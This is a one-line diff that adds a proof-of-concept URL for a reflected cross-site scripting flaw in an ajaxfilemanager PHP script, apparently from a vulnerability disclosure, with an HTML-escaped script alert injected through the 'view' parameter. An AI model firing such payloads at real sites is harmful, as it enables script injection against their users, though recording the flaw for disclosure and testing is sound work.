@@ -1,0 +1,2 @@
+http://www.example.com/ajaxfilemanager/ajaxfilemanager.php?path=../uploads/&view=1&lt;script&gt;alert(&quot;abysssec&quot;)&lt;/script&gt;
+
